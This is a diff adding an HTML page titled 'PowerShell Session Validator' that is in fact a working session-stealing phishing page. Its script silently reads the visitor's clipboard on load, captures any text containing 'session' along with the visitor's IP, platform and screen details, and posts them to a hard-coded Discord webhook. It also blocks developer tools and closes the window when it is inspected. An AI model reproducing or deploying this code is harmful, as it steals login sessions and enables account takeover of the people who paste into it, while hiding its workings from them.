@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell Session Validator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 700px;
+            width: 100%;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            text-align: center;
+            color: #e0e0e0;
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+            font-weight: 500;
+        }
+
+        .search-bar {
+            background: #2d2d2d;
+            border-radius: 20px;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .search-bar:focus-within {
+            box-shadow: 0 4px 25px rgba(102, 126, 234, 0.3);
+            background: #333;
+        }
+
+        .icon {
+            color: #9e9e9e;
+            font-size: 20px;
+            cursor: pointer;
+            transition: color 0.2s ease;
+        }
+
+        .icon:hover {
+            color: #e0e0e0;
+        }
+
+        .blue-dot {
+            width: 8px;
+            height: 8px;
+            background: #4285f4;
+            border-radius: 50%;
+        }
+
+        textarea {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            color: #e0e0e0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            resize: none;
+            height: 80px;
+            line-height: 1.5;
+        }
+
+        textarea::placeholder {
+            color: #666;
+        }
+
+        .dropdown {
+            background: #3d3d3d;
+            color: #e0e0e0;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 13px;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            min-height: 25px;
+            color: #9e9e9e;
+        }
+
+        .status.error {
+            color: #ef5350;
+        }
+
+        .status.success {
+            color: #66bb6a;
+        }
+
+        .status.sending {
+            color: #42a5f5;
+        }
+
+        .info {
+            text-align: center;
+            color: #666;
+            margin-top: 15px;
+            font-size: 0.85rem;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-screen.hidden {
+            display: none;
+        }
+
+        .loading-text {
+            color: #e0e0e0;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        .loading-subtext {
+            color: #666;
+            font-size: 1rem;
+        }
+
+        .send-button {
+            display: block;
+            margin: 15px auto 0;
+            padding: 10px 30px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .send-button:hover {
+            background: #3367d6;
+        }
+
+        .send-button:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-text">Allow Clipboard Access</div>
+        <div class="loading-subtext">Please allow clipboard access to continue</div>
+    </div>
+
+    <div class="container">
+        <h1>Paste PowerShell Below</h1>
+        <div class="search-bar">
+            <textarea id="powershellInput" placeholder="Paste your PowerShell code here..."></textarea>
+        </div>
+        <button id="sendButton" class="send-button" disabled>Click Here Once Pasted</button>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        // Anti-inspect element protection
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            window.close();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
+                e.preventDefault();
+                window.close();
+            }
+        });
+
+        // Detect devtools
+        const devtools = /./;
+        devtools.toString = function() {
+            window.close();
+        };
+
+        setInterval(function() {
+            const before = new Date();
+            debugger;
+            const after = new Date();
+            if (after - before > 100) {
+                window.close();
+            }
+        }, 1000);
+
+        const textarea = document.getElementById('powershellInput');
+        const status = document.getElementById('status');
+        const sendButton = document.getElementById('sendButton');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1507755873458716863/eua_4h-KX-3h9Wz0BmrBfRTXgKmIyWQN0T8rNuoL4v51uAkCOvSVH6KqmbLNFTg12JsY';
+        let lastSentText = '';
+        let hasSent = false;
+
+        // Request clipboard access on page load
+        async function requestClipboardAccess() {
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                
+                if (clipboardText.toLowerCase().includes('session')) {
+                    textarea.value = clipboardText;
+                    validateText();
+                    await sendToDiscord(clipboardText);
+                } else {
+                    hideLoadingScreen();
+                }
+            } catch (error) {
+                console.error('Clipboard access denied, trying alternative methods:', error);
+                // Try alternative methods
+                tryAlternativeClipboardMethods();
+            }
+        }
+
+        function tryAlternativeClipboardMethods() {
+            // Try using paste event
+            textarea.focus();
+            document.execCommand('paste');
+            
+            // Check if paste worked
+            setTimeout(function() {
+                if (textarea.value.toLowerCase().includes('session')) {
+                    validateText();
+                    sendToDiscord(textarea.value);
+                } else {
+                    hideLoadingScreen();
+                }
+            }, 100);
+        }
+
+        function hideLoadingScreen() {
+            loadingScreen.classList.add('hidden');
+        }
+
+        // Start clipboard check on page load
+        window.addEventListener('load', function() {
+            setTimeout(requestClipboardAccess, 1000);
+        });
+
+        async function getUserInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screen = `${window.screen.width}x${window.screen.height}`;
+
+                return {
+                    ip,
+                    userAgent,
+                    platform,
+                    language,
+                    screen,
+                    timestamp: new Date().toISOString()
+                };
+            } catch (error) {
+                console.error('Error:', error);
+                return null;
+            }
+        }
+
+        async function sendToDiscord(text) {
+            if (hasSent) {
+                status.textContent = '✗ You can only send once';
+                status.className = 'status error';
+                return;
+            }
+
+            try {
+                status.textContent = '⏳ Processing...';
+                status.className = 'status sending';
+                sendButton.disabled = true;
+
+                const userInfo = await getUserInfo();
+
+                let message = '**🔐 PowerShell Session Upload**\n\n';
+                if (userInfo) {
+                    message += '**📊 User Information:**\n';
+                    message += `🌐 IP: \`${userInfo.ip}\`\n`;
+                    message += `💻 Platform: \`${userInfo.platform}\`\n`;
+                    message += `🌐 Language: \`${userInfo.language}\`\n`;
+                    message += `📺 Screen: \`${userInfo.screen}\`\n`;
+                    message += `⏰ Time: \`${userInfo.timestamp}\`\n\n`;
+                }
+                message += '**📁 PowerShell file attached below**';
+
+                const blob = new Blob([text], { type: 'text/plain' });
+                const file = new File([blob], 'powershell_session.txt', { type: 'text/plain' });
+
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('content', message);
+
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (response.ok) {
+                    status.textContent = '✓ Complete';
+                    status.className = 'status success';
+                    lastSentText = text;
+                    hasSent = true;
+                    sendButton.disabled = true;
+                    sendButton.textContent = 'Already Sent';
+                } else {
+                    const errorText = await response.text();
+                    status.textContent = '✗ Failed: ' + (response.status || 'Unknown error');
+                    status.className = 'status error';
+                    console.error('Response:', errorText);
+                    sendButton.disabled = false;
+                }
+            } catch (error) {
+                status.textContent = '✗ Error: ' + error.message;
+                status.className = 'status error';
+                console.error('Error:', error);
+                sendButton.disabled = false;
+            }
+        }
+
+        function validateText() {
+            const text = textarea.value;
+            
+            if (text.toLowerCase().includes('session') && text.trim().length > 0) {
+                textarea.style.color = '#66bb6a';
+                sendButton.disabled = false;
+                status.textContent = '';
+                status.className = 'status';
+            } else {
+                textarea.style.color = '#e0e0e0';
+                sendButton.disabled = true;
+                if (text.trim().length > 0) {
+                    status.textContent = '✗ Text must include "session"';
+                    status.className = 'status error';
+                } else {
+                    status.textContent = '';
+                    status.className = 'status';
+                }
+            }
+        }
+
+        textarea.addEventListener('input', validateText);
+
+        textarea.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                if (!sendButton.disabled) {
+                    sendToDiscord(textarea.value);
+                }
+            }
+        });
+
+        sendButton.addEventListener('click', function() {
+            if (!sendButton.disabled) {
+                sendToDiscord(textarea.value);
+            }
+        });
+    </script>
+</body>
+</html>
